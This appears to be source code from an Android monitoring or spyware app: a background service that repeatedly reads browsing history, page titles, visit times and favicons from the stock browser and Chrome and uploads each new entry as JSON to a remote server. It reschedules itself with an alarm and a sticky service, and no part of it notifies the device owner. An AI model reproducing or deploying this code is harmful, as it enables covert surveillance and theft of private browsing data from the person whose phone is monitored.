package com.inet.android.history;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.database.SQLException;
import android.net.Uri;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.util.Base64;

import com.inet.android.request.RequestList;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * Browser history viewing class
 * 
 * @author johny homicide
 * 
 */
public class LinkService extends Service {

	private static final int SERVICE_REQUEST_CODE = 25; // service unique int
	final String LOG_TAG = LinkService.class.getSimpleName().toString();
	private SharedPreferences sPref;
	final String SAVED_TIME = "saved_time";
	private Context context;
	private SharedPreferences sp;

	public void onCreate() {
		super.onCreate();
//		startService(new Intent(this, LinkService.class));

		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		context = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(context);

	}

	public int onStartCommand(Intent intent, int flags, int startId) {

		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String linkEnd = sp.getString("www", "0");

		if (linkEnd.equals("0")) {
			Logging.doLog(LOG_TAG, "www : 0", "www : 0");

			return 0;
		}

		Calendar cal = Calendar.getInstance();
		// restart task after 1 minute
		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));

		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));

			return Service.START_STICKY;
		} else {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));
		}

		try {
			linkTask();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} // viewing history task

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public void onDestroy() {
		super.onDestroy();

		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
	}

	public IBinder onBind(Intent intent) {
		return null;
	}

	@SuppressLint("SimpleDateFormat")
	void linkTask() throws JSONException {
	
		String[] proj = new String[] { Browser.BookmarkColumns._ID,
				Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL,
				Browser.BookmarkColumns.VISITS, Browser.BookmarkColumns.DATE,
				Browser.BookmarkColumns.FAVICON };

		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0";

		// default browser
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();

		sPref = PreferenceManager.getDefaultSharedPreferences(context);

		String urlDate = "", url = "", title = "";

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				urlDate = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.DATE));
				Context context = getApplicationContext();

				DateFormat formatter = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				String savedTime = sPref.getString(SAVED_TIME, "");

				Calendar calendar = Calendar.getInstance();
				calendar.setTimeInMillis(Long.parseLong(savedTime));

				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {

					JSONObject info = new JSONObject();
					JSONObject object = new JSONObject();

					Logging.doLog(
							LOG_TAG,
							"saved time: "
									+ formatter.format(calendar.getTime())
											.toString(), "saved time: "
									+ formatter.format(calendar.getTime())
											.toString());
					String encodedImage;

					calendar = Calendar.getInstance();
					calendar.setTimeInMillis(Long.parseLong(urlDate));

					url = mCur.getString(mCur
							.getColumnIndex(Browser.BookmarkColumns.URL));
					title = mCur.getString(mCur
							.getColumnIndex(Browser.BookmarkColumns.TITLE));
					Logging.doLog(LOG_TAG, "url" + title, "url" + title);
					try {
						byte[] favicon = mCur
								.getBlob(mCur
										.getColumnIndex(Browser.BookmarkColumns.FAVICON));
						if (favicon != null) {
							encodedImage = Base64.encodeToString(favicon,
									Base64.DEFAULT);
							Logging.doLog(LOG_TAG, "image",
									"image");
							info.put("icon", encodedImage);
							favicon = null;

						}
					} catch (SQLException e) {
						Logging.doLog(LOG_TAG, "favicon error", "favicon error");
					}
					String urlDateInFormat = formatter.format(
							calendar.getTime()).toString();

					// String sendJSONStr = null;

					try {

						info.put("url", url);
						info.put("name", title);
						object.put("time", urlDateInFormat);
						object.put("type", "7");
						object.put("info", info);
						// sendJSONStr = jsonObject.toString();
						// sendJSONStr = data.toString();
					} catch (JSONException e) {
						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
					}
					RequestList.sendDataRequest(object.toString(), this);

					Editor ed = sPref.edit();
					ed.putString(SAVED_TIME, urlDate);
					ed.commit();

					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
							.toString() + " - " + url,
							formatter.format(calendar.getTime()).toString()
									+ " - " + url);
				}
				mCur.moveToNext();
			}
		}
		mCur.close();

		// chrome
		Uri uriCustom = Uri
				.parse("content://com.android.chrome.browser/bookmarks");
		Cursor chromeCursor = getContentResolver().query(uriCustom, proj, sel,
				null, null);
		String chromeUrlDate = "", chromeUrl = "", chromeTitle = "";

		// if (chromeCursor != null) {
		// chromeCursor.moveToFirst();
		// }

		if (chromeCursor != null)
			if (chromeCursor.moveToFirst() && chromeCursor.getCount() > 0) {
				boolean cont = true;
				while (chromeCursor.isAfterLast() == false && cont) {
					String encodedImage;
					// String sendJSONStr = null;
					JSONObject info = new JSONObject();
					JSONObject object = new JSONObject();

					chromeUrlDate = chromeCursor.getString(chromeCursor
							.getColumnIndex(Browser.BookmarkColumns.DATE));
					Context context = getApplicationContext();

					DateFormat formatter = new SimpleDateFormat(
							"yyyy-MM-dd HH:mm:ss");

					String savedTime = sPref.getString(SAVED_TIME, "");

					Calendar calendar = Calendar.getInstance();
					calendar.setTimeInMillis(Long.parseLong(savedTime));

					if (Long.parseLong(chromeUrlDate) > Long
							.parseLong(savedTime)) {

						Logging.doLog(LOG_TAG,
								"--- "
										+ formatter.format(calendar.getTime())
												.toString(), "--- "
										+ formatter.format(calendar.getTime())
												.toString());

						calendar = Calendar.getInstance();
						calendar.setTimeInMillis(Long.parseLong(chromeUrlDate));

						chromeUrl = chromeCursor.getString(chromeCursor
								.getColumnIndex(Browser.BookmarkColumns.URL));
						chromeTitle = chromeCursor.getString(chromeCursor
								.getColumnIndex(Browser.BookmarkColumns.TITLE));
						try {
							byte[] favicon = chromeCursor
									.getBlob(chromeCursor
											.getColumnIndex(Browser.BookmarkColumns.FAVICON));
							if (favicon != null) {
								encodedImage = Base64.encodeToString(favicon,
										Base64.DEFAULT);
								info.put("icon", encodedImage);
								favicon = null;

							}
						} catch (SQLException e) {
							Logging.doLog(LOG_TAG, "favicon error",
									"favicon error");
						}

						String urlDateInFormat = formatter.format(
								calendar.getTime()).toString();

						try {

							info.put("url", chromeUrl);
							info.put("name", chromeTitle);

							object.put("time", urlDateInFormat);
							object.put("type", "7");
							object.put("info", info);
						} catch (JSONException e) {
							Logging.doLog(LOG_TAG, "json сломался",
									"json сломался");
						}

						RequestList.sendDataRequest(object.toString(), this);

						Editor ed = sPref.edit();
						ed.putString(SAVED_TIME, chromeUrlDate);
						ed.commit();

						Logging.doLog(LOG_TAG,
								formatter.format(calendar.getTime()).toString()
										+ " - " + chromeUrl,
								formatter.format(calendar.getTime()).toString()
										+ " - " + chromeUrl);
					}
					chromeCursor.moveToNext();
				}
			}
		if (chromeCursor != null)
			chromeCursor.close();
	}
}
